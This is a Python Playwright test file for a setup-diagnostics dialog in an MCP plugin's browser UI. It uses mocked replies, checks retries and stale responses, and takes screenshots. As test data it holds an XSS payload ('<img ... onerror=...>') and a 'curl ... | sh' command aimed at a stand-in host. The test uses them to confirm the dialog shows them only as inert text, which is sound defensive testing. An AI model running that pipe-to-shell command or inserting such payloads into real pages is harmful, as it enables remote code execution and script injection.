"""Setup diagnostics in the real isolated MCP browser host, then controlled replies.

Requires an up-to-date bundle (built by the caller), Playwright and Chromium:
    python codex-plugin/tests/setup-check-browser.py
MATSUGIT_SCREENSHOTS selects the output directory; PLAYWRIGHT_CHROMIUM_EXECUTABLE
can select an existing browser. No builds, installs or external requests are made.
"""
from contextlib import contextmanager
import json
import os
from pathlib import Path
import selectors
import subprocess
import sys
import tempfile
import time

from playwright.sync_api import expect, sync_playwright

ROOT = Path(__file__).resolve().parents[2]
SOURCE = '---\ntitle: Setup test\n---\n\n## A local check\n\nKeep this file unchanged.\n'
LITERAL = '<img src="https://setup.invalid/probe" onerror="window.setupExecuted=true">'
COMMAND = 'curl https://setup.invalid/install | sh'
MISSING = {
    'schema': 1, 'ready': False, 'checks': [
        {'id': 'python', 'label': 'Python', 'required': True, 'status': 'ready',
         'detail': 'Found Python 3.12.'},
        {'id': 'quarto', 'label': 'Quarto ' + LITERAL, 'required': True,
         'status': 'missing', 'detail': 'Executable missing: ' + LITERAL,
         'remedy': COMMAND + '\n' + LITERAL},
        {'id': 'converter', 'label': 'Formatted editor (Pandoc)', 'required': True,
         'status': 'unsupported', 'detail': 'Found 2.0; need >= 3.7.0.2.'},
        {'id': 'charts', 'label': 'Optional charts', 'required': False,
         'status': 'missing', 'detail': 'Optional chart packages are unavailable.'},
        {'id': 'export', 'label': 'Optional export', 'required': False,
         'status': 'error', 'detail': 'Version probe failed at /' + 'long-path-' * 35},
    ],
}
OPTIONAL_ONLY = {'schema': 1, 'ready': True, 'checks': [MISSING['checks'][0], *MISSING['checks'][3:]]}
READY = {'schema': 1, 'ready': True, 'checks': [MISSING['checks'][0]]}


def wait(frame, expression, timeout=20):
    until = time.monotonic() + timeout
    while time.monotonic() < until:
        if frame.evaluate(expression):
            return
        frame.page.wait_for_timeout(50)
    raise AssertionError(expression + '\n' + frame.locator('body').inner_text()[-1800:])


def check_bundle():
    check = subprocess.run(['node', '--input-type=module', '-e', '''
      import fs from 'node:fs';
      import {bundledApp} from './codex-plugin/app-html.mjs';
      console.log(JSON.stringify({ui:bundledApp().includes('id="setup-dialog"'),
        tool:fs.readFileSync('codex-plugin/bundle/server.mjs','utf8').includes('matsugit_doctor')}));
    '''], cwd=ROOT, text=True, capture_output=True, timeout=20, check=True)
    assert all(json.loads(check.stdout).values()), (
        'BLOCKED: the current bundle lacks Check setup or matsugit_doctor. Have the build owner '
        'run npm run build in codex-plugin, then rerun this test with a Playwright-enabled Python. '
        'This test does not build the bundle.')


@contextmanager
def isolated_host(mode):
    with tempfile.TemporaryDirectory(prefix='matsugit-setup-check-') as temporary:
        root = Path(temporary)
        fixture = root / 'setup.md'
        fixture.write_text(SOURCE)
        # Do not inherit publishing configuration, tool overrides or real documents.
        env = {key: value for key, value in os.environ.items()
               if not key.startswith(('MATSUGIT_', 'FOLIOFORGE_', 'XDG_'))}
        env.update(HOME=temporary, XDG_CONFIG_HOME=str(root / 'config'),
                   XDG_DATA_HOME=str(root / 'data'), XDG_CACHE_HOME=str(root / 'cache'),
                   PYTHONDONTWRITEBYTECODE='1', MATSUGIT_PYTHON=sys.executable,
                   MATSUGIT_SHOWCASE_SOURCE=str(fixture), MATSUGIT_STANDARD_MCP='1',
                   MATSUGIT_TEST_HOST=mode, MATSUGIT_TEST_RESULT='summary',
                   MATSUGIT_TEST_OPEN_OPTIONS=json.dumps({'layout': 'source', 'editor': 'raw'}))
        with tempfile.TemporaryFile(mode='w+') as log:
            host = subprocess.Popen(['node', str(ROOT / 'codex-plugin/tests/browser-host.mjs')],
                                    cwd=ROOT, env=env, stdout=subprocess.PIPE, stderr=log, text=True)
            try:
                with selectors.DefaultSelector() as selector:
                    selector.register(host.stdout, selectors.EVENT_READ)
                    assert selector.select(30), 'Isolated browser host did not start within 30 seconds'
                line = host.stdout.readline()
                if not line:
                    log.seek(0)
                    raise AssertionError('Isolated browser host failed:\n' + log.read()[-4000:])
                ready = json.loads(line)
                yield ready
                assert fixture.read_text() == SOURCE
                assert Path(ready['source']).read_text() == SOURCE
                assert not (root / 'config').exists(), 'Setup check wrote user configuration'
            finally:
                host.terminate()
                try:
                    host.wait(timeout=20)
                except subprocess.TimeoutExpired:
                    host.kill()
                    host.wait(timeout=5)
                host.stdout.close()


def report_reply(report, text_only=False):
    result = {'content': [{'type': 'text', 'text': json.dumps(report)}]}
    if not text_only:
        result['structuredContent'] = report
    return {'result': result}


class Replies:
    def __init__(self, origin, cursor):
        self.origin, self.cursor = origin, cursor
        self.mock = False
        self.calls, self.held, self.real, self.outbound, self.forbidden = [], [], [], [], []

    def route(self, route):
        request = route.request
        if not request.url.startswith(self.origin + '/'):
            self.outbound.append(request.url)
            route.abort()
            return
        if request.url != self.origin + '/rpc':
            route.continue_()
            return
        message = request.post_data_json
        if self.cursor and message['method'] == 'ui/initialize':
            response = route.fetch()
            data = response.json()
            data['result']['hostContext']['containerDimensions'] = {'height': 320, 'maxHeight': 320}
            route.fulfill(json=data)
            return
        if message['method'] == 'tools/call':
            params = message['params']
            self.calls.append(params)
            name = params['name']
            if name == 'matsugit_doctor':
                assert params['arguments'] == {}, params
                if self.mock:
                    self.held.append(route)
                else:
                    response = route.fetch(timeout=75000)
                    self.real.append(response.json())
                    route.fulfill(response=response)
                return
            allowed = {'matsugit_read', 'matsugit_themes', 'matsugit_path',
                       'matsugit_preview', 'matsugit_preview_status', 'matsugit_preview_chunk',
                       'matsugit_preview_cancel', 'matsugit_recovery_begin',
                       'matsugit_recovery_checkpoint', 'matsugit_recovery_list'}
            passive_status = (name == 'matsugit_action'
                              and params['arguments'].get('action') == 'publication-status'
                              and params['arguments'].get('check') is False)
            if name not in allowed and name != 'matsugit_action_status' and not passive_status:
                self.forbidden.append(params)
                route.fulfill(json={'error': {'code': -32601, 'message': 'Unexpected tool in read-only test'}})
                return
        if message['method'] in ('ui/open-link', 'ui/message', 'ui/download-file', 'openai/resources/write'):
            self.forbidden.append(message)
            route.abort()
            return
        route.continue_()

    def count(self):
        return sum(call['name'] == 'matsugit_doctor' for call in self.calls)

    def take(self, page):
        until = time.monotonic() + 10
        while not self.held and time.monotonic() < until:
            page.wait_for_timeout(25)
        assert self.held, 'The dialog did not call matsugit_doctor'
        return self.held.pop(0)


def open_setup(frame):
    frame.locator('#more').click()
    expect(frame.locator('#more-panel')).to_be_visible()
    frame.get_by_role('button', name='Check setup', exact=True).click()
    expect(frame.get_by_role('dialog', name='Check setup', exact=True)).to_be_visible()
    expect(frame.locator('#more-panel')).to_be_hidden()
    expect(frame.locator('#setup-close')).to_be_focused()


def settled(frame, kind):
    expect(frame.locator('#setup-status')).to_have_attribute('data-kind', kind, timeout=75000)
    expect(frame.locator('#setup-retry')).to_be_enabled()
    expect(frame.locator('#setup-retry')).to_have_attribute('aria-busy', 'false')
    expect(frame.locator('#setup-results')).to_have_attribute('aria-busy', 'false')


def busy(frame):
    expect(frame.locator('#setup-retry')).to_be_disabled()
    expect(frame.locator('#setup-retry')).to_have_text('Checking...')
    expect(frame.locator('#setup-retry')).to_have_attribute('aria-busy', 'true')
    expect(frame.locator('#setup-results')).to_have_attribute('aria-busy', 'true')
    expect(frame.locator('#setup-results')).to_be_hidden()
    expect(frame.locator('#setup-status')).to_have_text('Checking tools...')
    expect(frame.locator('#setup-close')).to_be_enabled()


def no_overflow(frame):
    result = frame.evaluate('''() => {
      const dialog = document.getElementById('setup-dialog'), rect = dialog.getBoundingClientRect();
      const overflowing = [...dialog.querySelectorAll('*')].filter(e => {
        if (!e.getClientRects().length || e instanceof SVGElement) return false;
        const r = e.getBoundingClientRect();
        return e.scrollWidth > e.clientWidth + 1 && getComputedStyle(e).display !== 'inline'
          || r.left < rect.left - 1 || r.right > rect.right + 1;
      }).map(e => e.id || e.className || e.tagName);
      return {width:innerWidth, height:innerHeight, rect:rect.toJSON(), overflowing,
        documentOverflow:document.documentElement.scrollWidth > innerWidth + 1,
        dialogOverflow:dialog.scrollWidth > dialog.clientWidth + 1,
        collisions:[...dialog.querySelectorAll('.setup-tool-heading')].filter(e => {
          const label = e.firstElementChild.getBoundingClientRect(), verdict = e.lastElementChild.getBoundingClientRect();
          return label.right > verdict.left + 1;
        }).length};
    }''')
    assert not result['documentOverflow'] and not result['dialogOverflow'], result
    assert not result['overflowing'] and not result['collisions'], result
    rect = result['rect']
    assert 0 <= rect['x'] and rect['right'] <= result['width'] + 1, result
    assert 0 <= rect['y'] and rect['bottom'] <= result['height'] + 1, result


def screenshots(page, frame, shots, mode):
    sizes = [(1440, 900), (390, 844), (320, 568)] if mode == 'standard' else [(840, 600), (390, 600)]
    for width, height in sizes:
        page.set_viewport_size({'width': width, 'height': height})
        page.wait_for_timeout(150)
        if mode == 'cursor':
            assert frame.evaluate('innerHeight') == 320
        frame.locator('#setup-dialog').evaluate('e => { e.scrollTop = 0; }')
        no_overflow(frame)
        page.screenshot(path=str(shots / f'setup-{mode}-{width}-top.png'))
        # Every row and both controls must be reachable, not merely clipped away.
        for item in frame.locator('#setup-results li').all():
            item.scroll_into_view_if_needed()
        frame.locator('#setup-dialog').evaluate('e => { e.scrollTop = e.scrollHeight; }')
        no_overflow(frame)
        assert frame.locator('#setup-retry').evaluate('''e => {
          const r=e.getBoundingClientRect();
          return r.top >= 0 && r.bottom <= innerHeight && e.contains(document.elementFromPoint(r.x+r.width/2,r.y+r.height/2));
        }''')
        page.screenshot(path=str(shots / f'setup-{mode}-{width}-bottom.png'))
    frame.locator('#setup-close').scroll_into_view_if_needed()


def exercise(browser, ready, mode, shots):
    origin = f'http://127.0.0.1:{ready["port"]}'
    context = browser.new_context(viewport={'width': 1440, 'height': 900}, reduced_motion='reduce')
    replies = Replies(origin, mode == 'cursor')
    context.route('**/*', replies.route)
    page = context.new_page()
    errors, popups, downloads = [], [], []
    page.on('pageerror', lambda error: errors.append(str(error)))
    page.on('popup', lambda popup: popups.append(popup.url))
    page.on('download', lambda download: downloads.append(download.suggested_filename))
    try:
        page.goto(origin)
        frame = page.locator('#app').element_handle().content_frame()
        wait(frame, '!!window.matsugitWorkspace?.state.session && !matsugitWorkspace.state.loading')
        assert replies.count() == 0, 'Setup must not run automatically on open'
        expect(frame.locator('#setup-dialog')).to_be_hidden()

        open_setup(frame)
        expect(frame.locator('#setup-results')).to_be_visible(timeout=75000)
        assert len(replies.real) == 1, replies.real
        result = replies.real[0]['result']
        assert not result.get('isError'), result
        report = result['structuredContent']
        assert report['schema'] == 1 and report['checks'], report
        settled(frame, 'ready' if report['ready'] else 'attention')
        for required, group in ((True, 'required'), (False, 'optional')):
            expected = [check['id'] for check in report['checks'] if check['required'] is required]
            assert frame.locator(f'#setup-{group} li').evaluate_all('(rows) => rows.map(e => e.dataset.check)') == expected
        no_overflow(frame)
        page.screenshot(path=str(shots / f'setup-{mode}-real.png'))
        page.keyboard.press('Escape')
        expect(frame.locator('#setup-dialog')).to_be_hidden()
        expect(frame.locator('#more')).to_be_focused()

        replies.mock = True
        open_setup(frame)
        missing = replies.take(page)
        busy(frame)
        no_overflow(frame)
        page.screenshot(path=str(shots / f'setup-{mode}-busy.png'))
        before = replies.count()
        frame.locator('#setup-retry').evaluate('e => { e.click(); e.click(); }')
        page.wait_for_timeout(100)
        assert replies.count() == before, 'Disabled Retry submitted duplicate checks'
        missing.fulfill(json=report_reply(MISSING))
        settled(frame, 'attention')
        expect(frame.locator('#setup-status')).to_have_text('Required tools need attention.')
        expect(frame.locator('#setup-required li')).to_have_count(3)
        expect(frame.locator('#setup-optional li')).to_have_count(2)
        expect(frame.locator('[data-check=quarto] strong').first).to_have_text('Quarto ' + LITERAL)
        expect(frame.locator('[data-check=quarto] p').first).to_have_text('Executable missing: ' + LITERAL)
        expect(frame.locator('[data-check=quarto] .setup-remedy')).to_have_text('Next step: ' + COMMAND + '\n' + LITERAL)
        for check, text in [('converter', 'Use a supported version'), ('charts', 'Install Optional charts'), ('export', 'Check Optional export')]:
            expect(frame.locator(f'[data-check={check}] .setup-remedy')).to_contain_text(text)
        expect(frame.locator('#setup-dialog img, #setup-dialog script, #setup-dialog a')).to_have_count(0)
        assert not frame.evaluate('!!window.setupExecuted')
        screenshots(page, frame, shots, mode)

        frame.locator('#setup-retry').click()
        retry = replies.take(page)
        busy(frame)
        expect(frame.locator('#setup-results li')).to_have_count(0)
        retry.fulfill(json=report_reply(OPTIONAL_ONLY, text_only=True))
        settled(frame, 'ready')
        expect(frame.locator('#setup-status')).to_have_text('Required tools are ready. Some optional tools need attention.')
        expect(frame.locator('#setup-required li')).to_have_count(1)
        expect(frame.locator('#setup-optional li')).to_have_count(2)

        for payload, message in [
            ({'result': {'isError': True, 'content': [{'type': 'text', 'text': 'Setup check is busy; retry shortly.'}]}}, 'Setup check is busy; retry shortly.'),
            ({'result': {'isError': True, 'content': [{'type': 'text', 'text': 'Synthetic tool failure ' + LITERAL}]}}, 'Synthetic tool failure ' + LITERAL),
            ({'error': {'code': -32601, 'message': 'Unknown tool matsugit_doctor'}}, 'Unknown tool matsugit_doctor'),
            (report_reply({'schema': 2, 'ready': True, 'checks': []}), 'invalid setup report'),
        ]:
            frame.locator('#setup-retry').click()
            pending = replies.take(page)
            busy(frame)
            pending.fulfill(json=payload)
            settled(frame, 'error')
            expect(frame.locator('#setup-status')).to_contain_text(message)
            expect(frame.locator('#setup-results')).to_be_hidden()
            expect(frame.locator('#setup-dialog img')).to_have_count(0)
            no_overflow(frame)
            before = replies.count()
            page.wait_for_timeout(100)
            assert replies.count() == before, 'Setup retried without an explicit Retry'
        page.screenshot(path=str(shots / f'setup-{mode}-error.png'))

        # An old success cannot clear the new request's busy state; an old failure
        # cannot replace a completed report. Resolve in both orders without sleeps.
        for late_error in (False, True):
            frame.locator('#setup-retry').click()
            stale = replies.take(page)
            busy(frame)
            frame.locator('#setup-close').click()
            expect(frame.locator('#more')).to_be_focused()
            open_setup(frame)
            current = replies.take(page)
            busy(frame)
            if late_error:
                current.fulfill(json=report_reply(READY))
                settled(frame, 'ready')
                stale.fulfill(json={'error': {'code': -32603, 'message': 'Stale failure'}})
            else:
                stale.fulfill(json=report_reply(MISSING))
                page.wait_for_timeout(150)
                busy(frame)
                current.fulfill(json=report_reply(READY))
            settled(frame, 'ready')
            page.wait_for_timeout(150)
            expect(frame.locator('#setup-status')).to_have_text('Required tools are ready.')
            expect(frame.locator('#setup-required li')).to_have_count(1)
            expect(frame.locator('#setup-optional-group')).to_be_hidden()

        # Close and reopen in the same task: the native queued close event is stale.
        frame.locator('#setup-retry').click()
        stale = replies.take(page)
        frame.evaluate('''() => {
          document.getElementById('setup-close').click();
          document.getElementById('setup-check').click();
        }''')
        current = replies.take(page)
        stale.fulfill(json=report_reply(MISSING))
        current.fulfill(json=report_reply(READY))
        settled(frame, 'ready')
        expect(frame.locator('#setup-required li')).to_have_count(1)
        page.keyboard.press('Escape')
        expect(frame.locator('#setup-dialog')).to_be_hidden()
        expect(frame.locator('#more')).to_be_focused()
        before = replies.count()
        page.wait_for_timeout(200)
        assert replies.count() == before, 'Setup retried automatically after closing'
        assert not replies.held, 'Unresolved diagnostic requests'
        assert not replies.forbidden, replies.forbidden
        assert not replies.outbound, replies.outbound
        assert not errors and not popups and not downloads, (errors, popups, downloads)
        assert page.evaluate('window.openedLinks || []') == []
        assert page.evaluate('window.downloadRequests') == []
        assert page.evaluate('window.exportRequests') == 0
        if mode == 'cursor':
            assert page.evaluate('window.contextUpdates') == 0
            assert page.locator('#chat-prompt').input_value() == ''
        assert frame.evaluate('matsugitWorkspace.editor.state.doc.toString()') == SOURCE
        print(f'PASS: {mode}: real doctor, missing/optional, busy retry, errors, literal text, '
              'stale replies, screenshots, no overflow or external actions', flush=True)
    finally:
        context.close()


def main():
    check_bundle()
    shots = Path(os.environ['MATSUGIT_SCREENSHOTS']) if os.environ.get('MATSUGIT_SCREENSHOTS') else Path(
        tempfile.mkdtemp(prefix='matsugit-setup-shots-'))
    shots.mkdir(parents=True, exist_ok=True)
    print('Screenshots:', shots, flush=True)
    with sync_playwright() as p:
        browser = p.chromium.launch(executable_path=os.environ.get('PLAYWRIGHT_CHROMIUM_EXECUTABLE'))
        try:
            for mode in ('standard', 'cursor'):
                with isolated_host(mode) as ready:
                    exercise(browser, ready, mode, shots)
        finally:
            browser.close()


if __name__ == '__main__':
    main()
